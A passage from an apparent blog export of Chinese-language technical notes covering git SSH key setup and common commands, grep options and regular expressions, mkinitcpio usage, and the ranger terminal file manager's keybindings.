</blockquote>
<p>若出现<code>Hi</code>后是用户名，说明成功了</p>
<p><strong>修改<code>.git</code>下<code>config</code>中的<code>url</code></strong><br>修改前：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url &#x3D; https:&#x2F;&#x2F;github.com&#x2F;eonun&#x2F;eonun.github.io.git</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>修改为：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url &#x3D; git@github.com:eonun&#x2F;eonun.github.io.git</span><br></pre></td></tr></table></figure></p>
<h3 id="配置多平台ssh-key"><a href="#配置多平台ssh-key" class="headerlink" title="配置多平台ssh-key"></a>配置多平台ssh-key</h3><p><strong>分别生成<code>shh-key</code></strong><br>或者都使用同一个秘钥<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&#x27;eonun@qq.com&#x27;</span> -f ~/.ssh/gitee_id_rsa</span><br><span class="line">ssh-keygen -t rsa -C <span class="string">&#x27;eonun@qq.com&#x27;</span> -f ~/.ssh/github_id_rsa</span><br><span class="line">ssh-keygen -t rsa -C <span class="string">&#x27;eonun@qq.com&#x27;</span>		<span class="comment">#使用都使用同一个秘钥也可以</span></span><br><span class="line"><span class="comment"># -f 指定秘钥文件</span></span><br></pre></td></tr></table></figure></p>
<p><strong>配置</strong><br>新建<code>~/.ssh/config</code>添加内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># gitee</span><br><span class="line">Host gitee.com</span><br><span class="line">HostName gitee.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;gitee_id_rsa</span><br><span class="line"></span><br><span class="line"># github</span><br><span class="line">Host github.com</span><br><span class="line">HostName github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;github_id_rsa</span><br><span class="line"></span><br><span class="line"># coding</span><br><span class="line">Host eonun.coding.net</span><br><span class="line">HostName eonun.coding.net</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_rsa.pub</span><br></pre></td></tr></table></figure>
<p><code>Host</code>和<code>HostName</code>填写<code>git</code>服务器的域名，<code>IdentityFile</code>指定私钥的路径</p>
<p><strong>测试</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@gitee.com</span><br><span class="line">ssh -T git@github.com</span><br><span class="line">ssh -T git@eonun.coding.net</span><br></pre></td></tr></table></figure></p>
<h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><h4 id="新建仓库"><a href="#新建仓库" class="headerlink" title="新建仓库"></a>新建仓库</h4><p><strong>Code所在根目录执行</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><br><strong>将项目的所有文件添加到仓库中</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure><br><strong>添加README</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add README.md</span><br></pre></td></tr></table></figure><br><strong>提交到仓库</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git commit -m &quot;注释语句&quot;</span><br></pre></td></tr></table></figure><br><strong>将本地的仓库关联到GitHub，改成自己的地址</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote add origin https:&#x2F;&#x2F;github.com&#x2F;xxxxx&#x2F;Test.git</span><br></pre></td></tr></table></figure><br><strong>上传前pull一下</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git pull origin master</span><br></pre></td></tr></table></figure><br><strong>上传代码到远程仓库</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><br>中间可能会让你输入Username和Password，你只要输入github的账号和密码就行了。执行完后，如果没有异常，等待执行完就上传成功了。</p>
<h4 id="更新仓库"><a href="#更新仓库" class="headerlink" title="更新仓库"></a>更新仓库</h4><p><strong>查看当前的git仓库状态</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><br><strong>更新全部</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add *</span><br></pre></td></tr></table></figure><br><strong>接着添加更新说明</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git commit -m &quot;更新说明&quot;</span><br></pre></td></tr></table></figure><br><strong>先git pull,拉取当前分支最新代码</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure><br>出现：<code>fatal: 拒绝合并无关的历史</code>时使用<code>--allow-unrelated-histories</code>忽略版本不同造成的影响</p>
<p><strong>push到远程master分支上</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure>
<p><strong>不出意外，打开GitHub已经同步了</strong></p>
<h4 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h4><p><strong>查看所有分支</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git branch --all</span><br></pre></td></tr></table></figure><br><strong>重命名git远程分支</strong></p>
<p><strong>1、重命名远程分支对应的本地分支</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git branch -m old_local_branch_name new_local_branch_name</span><br></pre></td></tr></table></figure></p>
<p><strong>2、删除远程分支</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin :old_local_branch_name</span><br></pre></td></tr></table></figure></p>
<p><strong>3、重新推送新命名的本地分支</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin new_local_branch_name</span><br></pre></td></tr></table></figure></p>
<h4 id="书籍：中文-英文"><a href="#书籍：中文-英文" class="headerlink" title="书籍：中文 英文"></a>书籍：<a href="https://git-scm.com/book/zh/v2">中文</a> <a href="https://git-scm.com/book/en/v2">英文</a></h4>]]></content>
      <categories>
        <category>技能</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>grep高效用法</title>
    <url>/2019/10/23/grep%E9%AB%98%E6%95%88%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<h1 id="grep命令"><a href="#grep命令" class="headerlink" title="grep命令"></a>grep命令</h1><p>  <code>grep</code>是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来</p>
<h2 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h2><a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-a 	不要忽略二进制数据</span><br><span class="line">-A&lt;显示列数&gt; 	同时显示后面的行</span><br><span class="line">-b 	同时显示前面的行</span><br><span class="line">-c 	统计符合范本样式的行数</span><br><span class="line">-C&lt;列数&gt;或-&lt;列数&gt;  	同时显示该前后几列&#x2F;行的内容</span><br><span class="line">-d&lt;动作&gt; 	指定查找目录，必须使用这项参数</span><br><span class="line">-e&lt;样式&gt; 	指定字符串作为查找文件内容的样式</span><br><span class="line">-E 	使用扩展正则表达式，相当于egrep</span><br><span class="line">-f&lt;文件&gt; 	指定文件，可一个或多个</span><br><span class="line">-F 	将样式视为固定字符串的列表</span><br><span class="line">-G 	将样式视为普通的表示法来使用</span><br><span class="line">-h 	不标示该列所属的文件名称</span><br><span class="line">-H 	标示该列的文件名称</span><br><span class="line">-i 	忽略大小写</span><br><span class="line">-l 	列出文件内容符合样式的文件名</span><br><span class="line">-L 	列出文件内容不符合样式的文件名</span><br><span class="line">-n 	显示行号</span><br><span class="line">-q 	不显示任何信息</span><br><span class="line">-r 	递归</span><br><span class="line">-s 	不显示错误信息</span><br><span class="line">-v 	反向查找</span><br><span class="line">-w 	只显示全字符合的行</span><br><span class="line">-x 	只显示全行符合的行</span><br><span class="line">-y 	同“-i”</span><br><span class="line">-o 	只输出文件中匹配到的部分</span><br><span class="line">--color  高亮显示搜索，多数系统默认支持</span><br></pre></td></tr></table></figure>
<h2 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h2><p><strong>输出除搜索的内容外的内容</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -v <span class="string">&quot;搜索的内容&quot;</span> file_name</span><br></pre></td></tr></table></figure>
<p><strong>只输出匹配的内容</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;this is a test line.&quot;</span> | grep -o -E <span class="string">&quot;[a-z]+\.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> this is a <span class="built_in">test</span> line. | egrep -o <span class="string">&quot;[a-z]+\.&quot;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>line.</p>
</blockquote>
<p><strong>显示行号</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;text&quot;</span> -n file_name</span><br></pre></td></tr></table></figure>
<p><strong>在多级目录中对文本进行递归搜索</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;text&quot;</span> /tmp/ -r -n</span><br></pre></td></tr></table></figure></p>
<h2 id="规则表达式"><a href="#规则表达式" class="headerlink" title="规则表达式"></a>规则表达式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">^    <span class="comment"># 锚定行的开始 如：&#x27;^grep&#x27;匹配所有以grep开头的行。    </span></span><br><span class="line">$    <span class="comment"># 锚定行的结束 如：&#x27;grep$&#x27; 匹配所有以grep结尾的行。</span></span><br><span class="line">.    <span class="comment"># 匹配一个非换行符的字符 如：&#x27;gr.p&#x27;匹配gr后接一个任意字符，然后是p。    </span></span><br><span class="line">*    <span class="comment"># 匹配零个或多个先前字符 如：&#x27;*grep&#x27;匹配所有一个或多个空格后紧跟grep的行。    </span></span><br><span class="line">.*   <span class="comment"># 一起用代表任意字符。   </span></span><br><span class="line">[]   <span class="comment"># 匹配一个指定范围内的字符，如&#x27;[Gg]rep&#x27;匹配Grep和grep。    </span></span><br><span class="line">[^]  <span class="comment"># 匹配一个不在指定范围内的字符，如：&#x27;[^A-FH-Z]rep&#x27;匹配不包含A-R和T-Z的一个字母开头，紧跟rep的行。    </span></span><br><span class="line">\(..\)  <span class="comment"># 标记匹配字符，如&#x27;\(love\)&#x27;，love被标记为1。    </span></span><br><span class="line">\&lt;      <span class="comment"># 锚定单词的开始，如:&#x27;\&lt;grep&#x27;匹配包含以grep开头的单词的行。    </span></span><br><span class="line">\&gt;      <span class="comment"># 锚定单词的结束，如&#x27;grep\&gt;&#x27;匹配包含以grep结尾的单词的行。    </span></span><br><span class="line">x\&#123;m\&#125;  <span class="comment"># 重复字符x，m次，如：&#x27;0\&#123;5\&#125;&#x27;匹配包含5个o的行。    </span></span><br><span class="line">x\&#123;m,\&#125;   <span class="comment"># 重复字符x,至少m次，如：&#x27;o\&#123;5,\&#125;&#x27;匹配至少有5个o的行。    </span></span><br><span class="line">x\&#123;m,n\&#125;  <span class="comment"># 重复字符x，至少m次，不多于n次，如：&#x27;o\&#123;5,10\&#125;&#x27;匹配5--10个o的行。   </span></span><br><span class="line">\w    <span class="comment"># 匹配文字和数字字符，也就是[A-Za-z0-9]，如：&#x27;G\w*p&#x27;匹配以G后跟零个或多个文字或数字字符，然后是p。   </span></span><br><span class="line">\W    <span class="comment"># \w的反置形式，匹配一个或多个非单词字符，如点号句号等。   </span></span><br><span class="line">\b    <span class="comment"># 单词锁定符，如: &#x27;\bgrep\b&#x27;只匹配grep。  </span></span><br></pre></td></tr></table></figure>
<h2 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h2><p><strong>使用扩展正则表达式</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -E <span class="string">&quot;[1-9]&quot;</span></span><br><span class="line"></span><br><span class="line">egrep <span class="string">&quot;[1-9]&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>行前(<code>^</code>) 行尾(<code>$</code>)</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搜索以某字符串开头</span></span><br><span class="line">grep ^<span class="built_in">test</span> file_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索以某字符串结尾</span></span><br><span class="line">grep <span class="built_in">test</span>$ file_name</span><br></pre></td></tr></table></figure></p>
<p><strong>任意一个字符(<code>.</code>) 任意多字符(<code>*</code>)</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 以good为例</span></span><br><span class="line">grep go.d file_name</span><br><span class="line"></span><br><span class="line">grep g*d file_name</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>mkinitcpio详解</title>
    <url>/2019/09/23/mkinitcpio%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>initramfs映像是一个SVR4 CPIO归档文件，通过find和bsdcpio命令生成，可选择使用内核理解的压缩方案进行压缩<br>mkinitcpio是创建initramfs的bash脚本</p>
<p>每次升级内核，mkinitcpio都会默认创建两个内存盘镜像：默认镜像<code>/boot/initramfs-linux.img</code>和fallback镜像<code>/boot/initramfs-linux-fallback.img</code>。fallback镜像和默认镜像只有一个区别，就是创建时跳过了autodetect钩子扩展，因而它包含更多的内核模块。autodetect扩展会探测硬件信息，针对硬件向镜像添加需要的模块，因此缩小了镜像。</p>
<h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><h3 id="使用默认内核linux生成镜像："><a href="#使用默认内核linux生成镜像：" class="headerlink" title="使用默认内核linux生成镜像："></a>使用默认内核<code>linux</code>生成镜像：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkinitcpio -p linux</span><br></pre></td></tr></table></figure>
<p><code>-p</code>选项定义了要使用的预配置（preset）；多数内核软件包都会提供一套mkinitcpio预配置文件，放在<code>/etc/mkinitcpio.d</code>目录（比如，linux内核是/etc/mkinitcpio.d/linux.preset）。预配置文件中包含内存盘镜像的基本配置。</p>
<a id="more"></a>
<h3 id="生成自定义initcpio"><a href="#生成自定义initcpio" class="headerlink" title="生成自定义initcpio"></a>生成自定义initcpio</h3><p>使用其他配置文件创建镜像，例如以<code>/etc/mkinitcpio-custom.conf</code>配置的内容生成镜像<code>/boot/linux-custom.img</code><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkinitcpio -c /etc/mkinitcpio-custom.conf -g /boot/linux-custom.img</span><br></pre></td></tr></table></figure></p>
<p>使用指定内核创建镜像，可在<code>/usr/lib/modules</code>目录下可查看支持的内核<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkinitcpio -g /boot/linux-custom2.img -k 4.19.69-1-MANJARO</span><br></pre></td></tr></table></figure></p>
<h2 id="mkinitcpio用法："><a href="#mkinitcpio用法：" class="headerlink" title="mkinitcpio用法："></a>mkinitcpio用法：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkinitcpio [选项]</span><br><span class="line"> 选项：</span><br><span class="line">   -A，--addhooks &lt;hooks&gt; 	将指定的钩子（以逗号分隔）添加到映像</span><br><span class="line">   -c，--config &lt;config&gt; 	使用备用配置文件。 （默认值：/etc/mkinitcpio.conf）</span><br><span class="line">   -g，--generate &lt;路径&gt; 	生成cpio映像并写入指定的路径</span><br><span class="line">   -H，--hookhelp &lt;hookname&gt; 显示给定钩子和退出的帮助</span><br><span class="line">   -h，--<span class="built_in">help</span> 				显示此消息并退出</span><br><span class="line">   -k，--kernel &lt;kernelver&gt; 使用指定的内核版本（默认值：4.19.69-1-MANJARO）</span><br><span class="line">   -L，--listhooks 			列出所有可用的钩子</span><br><span class="line">   -M，--automods 			通过自动检测找到的显示模块</span><br><span class="line">   -n，--nocolor 			禁用彩色输出消息</span><br><span class="line">   -p，--preset &lt;文件&gt; 		从/etc/mkinitcpio.d构建指定的预设</span><br><span class="line">   -P，--allpresets 		处理/etc/mkinitcpio.d中的所有预设文件</span><br><span class="line">   -r，--moduleroot &lt;dir&gt; 	模块的根目录（默认值：/）</span><br><span class="line">   -S，--skiphooks &lt;hooks&gt; 	在构建过程中跳过用逗号分隔的指定钩子</span><br><span class="line">   -s，--save 				保存构建目录。 （默认值：否）</span><br><span class="line">   -d，--genicir &lt;dir&gt; 		将生成的图像写入&lt;dir&gt;</span><br><span class="line">   -t，--builddir &lt;dir&gt; 	使用DIR作为临时构建目录</span><br><span class="line">   -V，--version 			显示版本信息并退出</span><br><span class="line">   -v，--verbose 			详细输出（默认值：no）</span><br><span class="line">   -z，--compress &lt;程序&gt; 	在映像上使用备用压缩器</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>命令</tag>
      </tags>
  </entry>
  <entry>
    <title>ranger终端文件管理器</title>
    <url>/2019/10/03/ranger%E7%BB%88%E7%AB%AF%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%99%A8/</url>
    <content><![CDATA[<p><a href="https://github.com/ranger/ranger">ranger</a> 是一个以Python编写，绑定vi/vim键的终端文件管理器</p>
<h1 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># archlinux系</span></span><br><span class="line">sudo pacman -S ranger</span><br><span class="line"><span class="comment"># redhat系</span></span><br><span class="line">sudo yum install -y ranger</span><br><span class="line"><span class="comment"># Debian系</span></span><br><span class="line">sudo apt-get install -y ranger</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="ranger命令选项"><a href="#ranger命令选项" class="headerlink" title="ranger命令选项"></a>ranger命令选项</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--version 				<span class="comment">#显示程序的版本号并退出</span></span><br><span class="line">-h，--<span class="built_in">help</span> 				<span class="comment">#显示此帮助消息并退出</span></span><br><span class="line">-d，--debug 			<span class="comment">#激活调试模式</span></span><br><span class="line">-c，--clean 			<span class="comment">#不要触摸/不需要任何配置文件</span></span><br><span class="line">--logfile=file 			<span class="comment">#要使用的日志文件，&#x27;-&#x27;代表stderr</span></span><br><span class="line">--cachedir=dir 			<span class="comment">#更改缓存目录（~/.cache/ranger）</span></span><br><span class="line">-r dir，--confdir=dir 	<span class="comment">#更改配置目录（~/.config/ranger）</span></span><br><span class="line">--datadir=dir 			<span class="comment">#更改数据目录（~/.local/share/ranger）</span></span><br><span class="line">--copy-config=<span class="built_in">which</span> 	<span class="comment">#将默认配置复制到用户配置目录，可用值：all, rc, rifle, commands,commands_full, scope</span></span><br><span class="line">--choosefile=OUTFILE 	<span class="comment">#使Ranger像文件选择器一样工作，打开文件时，它将退出并将所选文件的名称写入OUTFILE。</span></span><br><span class="line">--choosefiles=OUTFILE 	<span class="comment">#使Ranger就像一次选择多个文件一样，打开文件时，它将退出并将所有选定文件的名称写入OUTFILE。</span></span><br><span class="line">--choosedir=OUTFILE 	<span class="comment">#使Ranger像目录选择器一样工作，退出Ranger时，它将最后访问的目录的名称写入OUTFILE</span></span><br><span class="line">--selectfile=filepath 	<span class="comment">#打开带有选定文件的游侠</span></span><br><span class="line">--show-only-dirs 		<span class="comment">#仅显示目录，不显示文件或链接</span></span><br><span class="line">--list-unused-keys 		<span class="comment">#出未绑定到任何动作的通用键</span></span><br><span class="line">--list-tagged-files=tag <span class="comment">#列出所有使用给定标签标记的文件，默认：*</span></span><br><span class="line">--profile 				<span class="comment">#输出退出时CPU使用率的统计信息</span></span><br><span class="line">--cmd=COMMAND 			<span class="comment">#读取配置后执行COMMAND，多次使用此选项可运行多个命令</span></span><br></pre></td></tr></table></figure>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul>
<li>生成配置文件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ranger --copy-config=all</span><br><span class="line"><span class="comment"># 该命令自动将配置文件复制到~/.config/ranger/，作为用户配置文件</span></span><br></pre></td></tr></table></figure></li>
<li>相关配置文件<ul>
<li><code>~/.config/ranger/rc.conf</code> 选项设置和快捷键</li>
<li><code>~/.config/ranger/scope.sh</code> 设置可预览的文件类型</li>
<li><code>~/.config/ranger/rifle.conf</code> 指定不同类型文件的默认打开程序</li>
<li><code>~/.config/ranger/commands.py</code> 能通过<code>:</code>执行的命令</li>
<li><code>~/.config/ranger/commands_full.py</code></li>
</ul>
</li>
</ul>
<p>文件scope.sh中, 在externsions部分注释掉不想预览的文件类型, 在那行上面添加”#”注释掉即可. ranger在预览rar等压缩包时会运行得比较慢</p>
<h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><h3 id="查看帮助"><a href="#查看帮助" class="headerlink" title="查看帮助"></a>查看帮助</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">?    </span><br></pre></td></tr></table></figure>
<ul>
<li><code>m</code> 打开man帮助页</li>
<li><code>k</code> 显示键位绑定</li>
<li><code>c</code> 显示可用ranger的命令</li>
<li><code>s</code> 显示配置</li>
<li><code>q</code> 退出帮助</li>
</ul>
<h3 id="浏览"><a href="#浏览" class="headerlink" title="浏览"></a>浏览</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">k</span> 		#向上移动</span><br><span class="line"><span class="keyword">j</span> 		#向下移动</span><br><span class="line">h 		#向左移动（浏览文件夹时，表示回到上一级目录）</span><br><span class="line"><span class="keyword">l</span> 		#向右移动（光标处于文件夹上，进入目录，处于文件上，打开该文件） </span><br><span class="line">H 		#后退</span><br><span class="line">L 		#前进</span><br><span class="line">gg 		#跳到顶端</span><br><span class="line">G 		#跳到底端</span><br><span class="line">gh 		#go home</span><br><span class="line">% 		#默认跳到页中，加数字为跳到百分比处</span><br><span class="line">gl 		#若项为符号链接，逃到其原始位置</span><br><span class="line">gn 		#新建标签</span><br><span class="line"><span class="keyword">f</span> 		#查找</span><br><span class="line">/ 		#搜素</span><br><span class="line"><span class="keyword">cd</span> 		#跳转到目录，同 :<span class="keyword">cd</span></span><br><span class="line">g 		#快速进入目录</span><br><span class="line"><span class="symbol">&lt;Ctrl-U&gt;</span> 	#向上翻半页</span><br><span class="line"><span class="symbol">&lt;Ctrl-D&gt;</span> 	#向下翻半页</span><br></pre></td></tr></table></figure>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">#和 <span class="keyword">vim</span> 一样，指令之前可以指定一个数字，表示执行多少次指令</span><br><span class="line"><span class="number">5</span><span class="symbol">&lt;Ctrl-D&gt;</span> 	#向下翻<span class="number">5</span>个半页</span><br><span class="line"><span class="number">3</span>h 				#向上跳<span class="number">3</span>级目录</span><br><span class="line"><span class="number">6</span>gg 或 <span class="number">6</span>G 		#跳第<span class="number">6</span>行 </span><br><span class="line"><span class="number">20</span>% 			#跳到当前页的 <span class="number">20</span>% 处</span><br><span class="line"># 搜索</span><br><span class="line">＃/ 后输入要搜索的字符串搜索　n 查找下一结果　<span class="keyword">N</span> 查找上一结果</span><br><span class="line"><span class="keyword">cc</span> 			#通过 ctime 属性依次遍历 </span><br><span class="line"><span class="keyword">cm</span> 			#通过 mime <span class="built_in">type</span> 属性依次遍历 </span><br><span class="line"><span class="keyword">cs</span> 			#通过 size 属性依次遍历 </span><br><span class="line">ct 			#搜索已标记的文件 </span><br></pre></td></tr></table></figure>
<h3 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a>编辑</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;Space&gt;</span> 	#选择</span><br><span class="line">uv 			#取消选择</span><br><span class="line">yy 			#复制</span><br><span class="line">dd 			#剪切</span><br><span class="line"><span class="keyword">pp</span> 			#粘贴</span><br><span class="line">:<span class="keyword">delete</span> 	#删除</span><br><span class="line"><span class="keyword">cw</span> 			#重命名</span><br><span class="line">A 			#在当前名称基础上重命名</span><br><span class="line">I 			#类似A, 但是光标会跳到起始位置</span><br><span class="line"><span class="symbol">&lt;Ctrl-f&gt;</span> 	#向下翻页</span><br><span class="line"><span class="symbol">&lt;Ctrl-b&gt;</span> 	#向上翻页</span><br></pre></td></tr></table></figure>
<h3 id="书签、标签页"><a href="#书签、标签页" class="headerlink" title="书签、标签页"></a>书签、标签页</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"># 书签</span><br><span class="line"><span class="keyword">m</span><span class="symbol">&lt;key&gt;</span> 		＃新建书签</span><br><span class="line">`<span class="symbol">&lt;key&gt;</span> 		#打开书签</span><br><span class="line">um<span class="symbol">&lt;key&gt;</span> 	#删除书签</span><br><span class="line"></span><br><span class="line"># 标签页</span><br><span class="line">gn / <span class="symbol">&lt;Ctrl-n&gt;</span> 		#新建标签</span><br><span class="line">gt / <span class="symbol">&lt;TAB&gt;</span> 			#下一标签</span><br><span class="line">gT / <span class="symbol">&lt;Shift-TAB&gt;</span> 	#上一标签</span><br><span class="line">g[n] 				＃打开指定标签，[n]为<span class="number">1</span>~<span class="number">9</span>的标签号，若标签不存在则新建</span><br><span class="line"><span class="symbol">&lt;Alt-Right&gt;</span> / <span class="symbol">&lt;Alt-Left&gt;</span> 	#切换标签</span><br><span class="line">gc / <span class="symbol">&lt;Ctrl-w&gt;</span> 			#关闭当前标签，但不能关闭最后一个标签</span><br></pre></td></tr></table></figure>
<h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">on</span>/ob 	#根据文件名进行排序</span><br><span class="line">oc 		#根据改变时间进行排序</span><br><span class="line">os 		#根据文件大小进行排序</span><br><span class="line">ot 		#根据后缀名进行排序</span><br><span class="line">oa 		#根据访问时间进行排序</span><br><span class="line"><span class="keyword">om</span> 		#根据修改进行排序</span><br><span class="line"><span class="built_in">or</span> 		#反向排序,ranger 默认是以升序排列文件</span><br></pre></td></tr></table></figure>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"># 链接</span><br><span class="line">pl 		#粘贴已被复制、剪切文件的绝对路径的链接</span><br><span class="line">pL 		#粘贴已被复制、剪切文件的相对路径的链接</span><br><span class="line">phl 	#粘贴硬链接</span><br><span class="line"></span><br><span class="line"># 其他</span><br><span class="line">zh 		#显示隐藏文件</span><br><span class="line">zp 		#打开/关闭文件预览功能</span><br><span class="line">zP 		#打开目录预览功能</span><br></pre></td></tr></table></figure>
<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="选择文件"><a href="#选择文件" class="headerlink" title="选择文件"></a>选择文件</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;Space&gt;</span> 	#选择文件并跳到下一项</span><br><span class="line">v 			#全选</span><br><span class="line">V / uv 		#取消全选</span><br><span class="line"><span class="symbol">&lt;Ctrl-V&gt;</span> 	#从某个位置开始选择</span><br><span class="line"><span class="keyword">u</span><span class="symbol">&lt;Ctrl-V&gt;</span> 	#取消选择到某个位置</span><br><span class="line">  #如 <span class="symbol">&lt;Ctrl-V&gt;</span>gg 选择从当前位置到顶部的所有项，<span class="symbol">&lt;Ctrl-V&gt;</span>G 选择从当前位置到底部的所有项 <span class="keyword">u</span><span class="symbol">&lt;Ctrl-V&gt;</span> 用法也是如此</span><br><span class="line">t 		#标记/取消标记 被选择项</span><br><span class="line">T 		#取消标记被选择项</span><br></pre></td></tr></table></figure>
<h3 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">i 		#查看当前文本文件内容</span><br></pre></td></tr></table></figure>
<h3 id="编辑文件"><a href="#编辑文件" class="headerlink" title="编辑文件"></a>编辑文件</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">E 		#调用默认编辑器编辑文件</span><br></pre></td></tr></table></figure>
<h3 id="处理文件"><a href="#处理文件" class="headerlink" title="处理文件"></a>处理文件</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cw</span> / :<span class="built_in">rename</span> 	#重新命名，不保留原名修改</span><br><span class="line">A 		#修改文件名，在原名上修改</span><br><span class="line">I 		#同 A 但光标在文件名前</span><br><span class="line">yy 		#复制</span><br><span class="line">dd 		#剪切</span><br><span class="line"><span class="keyword">pp</span> 		#粘贴，存在同名，自动重命名</span><br><span class="line"><span class="keyword">po</span> 		#粘贴，覆盖同名文件</span><br><span class="line">pl 		#创建一个被复制、剪切文件的符号链接</span><br><span class="line">pL 		#创建一个被复制、剪切文件的相对路径符号链接</span><br><span class="line">:<span class="keyword">delete</span> 	#删除所选项  :<span class="keyword">delete</span> <span class="keyword">y</span> 多文件删除跳过确认</span><br></pre></td></tr></table></figure>
<h3 id="批量修改文件名"><a href="#批量修改文件名" class="headerlink" title="批量修改文件名"></a>批量修改文件名</h3><p>批量选择文件后, 键入命令<code>:bulkname</code> 会打开编辑器, 将列出文件名编辑后保存退出，确认编辑, 然后就批量改名了, 如果想取消批量改名, 在确认时把内容删除即</p>
